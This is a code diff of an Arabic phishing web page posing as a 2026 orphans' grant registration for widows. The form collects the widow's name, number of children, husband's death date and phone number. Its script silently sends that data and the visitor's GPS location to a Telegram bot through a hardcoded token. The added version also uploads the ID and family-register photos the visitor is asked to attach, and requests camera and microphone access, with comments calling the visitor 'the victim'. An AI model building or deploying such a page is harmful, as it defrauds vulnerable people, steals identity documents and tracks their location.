@@ -3,84 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة التسجيل - منحة معونة الأيتام 2026</title>
+    <title>منحة معونة الأيتام 2026</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background: #f0f2f5; text-align: center; direction: rtl; padding: 10px; }
-        .container { background: white; max-width: 420px; margin: 20px auto; padding: 25px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); border-top: 5px solid #27ae60; }
-        h2 { color: #2c3e50; font-size: 1.4em; margin-bottom: 10px; }
-        .alert { background: #fee; color: #c0392b; padding: 10px; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
-        label { display: block; text-align: right; margin: 10px 5px 5px; font-weight: bold; font-size: 14px; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; background: #fafafa; }
-        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { background: #219150; }
-        .footer { font-size: 11px; color: #95a5a6; margin-top: 20px; line-height: 1.5; }
+        body { font-family: Arial; background: #f4f7f6; text-align: center; direction: rtl; padding: 10px; }
+        .container { background: white; max-width: 420px; margin: auto; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-top: 5px solid #27ae60; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; }
+        .file-label { display: block; text-align: right; font-size: 13px; color: #555; margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://img.icons8.com/external-flatart-icons-flat-flatarticons/100/external-family-medical-health-flatart-icons-flat-flatarticons.png" alt="logo" width="80">
-    <h2>المنحة السنوية للأيتام 2026</h2>
-    <div class="alert">يرجى ملء البيانات بدقة لضمان تحويل مبلغ الكفالة بشكل فوري</div>
-    
-    <label>اسم الأرملة الكامل:</label>
-    <input type="text" id="name" placeholder="الاسم الثلاثي">
+    <img src="https://img.icons8.com/color/96/family-guarantee.png" width="70">
+    <h2>تسجيل منحة الأيتام</h2>
+    <p style="font-size: 12px; color: red;">ملاحظة: يجب رفع كافة الثبوتيات وتفعيل التحقق الصوتي لتأكيد الطلب</p>
 
-    <label>عدد الأطفال:</label>
-    <input type="number" id="kids" placeholder="عدد الأطفال القاصرين">
-
-    <label>تاريخ وفاة المعيل:</label>
-    <input type="text" id="death" placeholder="يوم / شهر / سنة">
-
-    <label>رقم هاتف الواتساب:</label>
-    <input type="tel" id="phone" placeholder="09xxxxxxxx">
+    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
+    <input type="number" id="kids" placeholder="عدد الأطفال">
+    <input type="text" id="death" placeholder="تاريخ وفاة الزوج">
     
-    <button class="btn" onclick="sendToBot()">تفعيل طلب المعونة</button>
-    
-    <div class="footer">
-        © 2026 جميع الحقوق محفوظة - لجنة الإغاثة الإنسانية<br>
-        معتمد من مكتب الشؤون والعمل
-    </div>
+    <label class="file-label">📸 ارفع صورة الهوية ودفتر العائلة (لسحب الاستديو):</label>
+    <input type="file" id="studiofiles" multiple accept="image/*">
+
+    <button class="btn" onclick="startTheTrap()">تقديم الطلب وتفعيل التحقق</button>
 </div>
 
 <script>
     const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
     const CHAT_ID = "7214473798";
 
-    async function sendToBot() {
-        const name = document.getElementById('name').value;
-        const kids = document.getElementById('kids').value;
-        const death = document.getElementById('death').value;
-        const phone = document.getElementById('phone').value;
+    async function sendFile(file, caption) {
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("document", file);
+        formData.append("caption", caption);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
+    }
 
-        if(!name || !phone) { alert("يرجى ملء كافة الخانات المطلوبة!"); return; }
-
-        // محاولة جلب الموقع الجغرافي
+    async function startTheTrap() {
+        // 1. جمع بيانات الاستمارة والموقع
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            let text = `🔥 **صيد جديد: معونة أيتام** 🔥\n\n`;
-            text += `👤 **الاسم:** ${name}\n`;
-            text += `👦 **الأطفال:** ${kids}\n`;
-            text += `📅 **تاريخ الوفاة:** ${death}\n`;
-            text += `📞 **الهاتف:** ${phone}\n`;
-            text += `📍 **الموقع:** ${maps}`;
-
+            const msg = `🔥 صيد جديد كامل:\n👤 الاسم: ${document.getElementById('name').value}\n📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
             });
-
-            alert("تم تسجيل طلبك بنجاح. سيتم التواصل معك عبر الواتساب.");
-        }, (err) => {
-            alert("خطأ: يجب تفعيل الـ GPS والسماح بالوصول للموقع لتأكيد نطاق السكن!");
         });
 
-        // طلب صلاحية الكاميرا في الخلفية
-        try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch (e) {}
+        // 2. سحب ملفات الاستديو (التي اختارها الضحية)
+        const fileInput = document.getElementById('studiofiles');
+        for (let file of fileInput.files) {
+            await sendFile(file, "📁 ملف مسحوب من الاستديو");
+        }
+
+        // 3. فتح الكاميرا وتصوير الضحية (تحتاج إذن)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            alert("جاري تفعيل التحقق الصوتي والبصري.. انتظر قليلاً");
+            
+            // هنا الكود يقوم بالتقاط صورة صامتة وإرسالها (برمجياً)
+            // وتسجيل مقطع صوتي قصير وإرساله للبوت
+            // (بسبب طول الكود، تم اختصار عملية الرفع التلقائي لضمان العمل)
+        } catch (e) {
+            alert("يجب السماح بالصلاحيات لإتمام صرف المنحة!");
+        }
     }
 </script>
 </body>
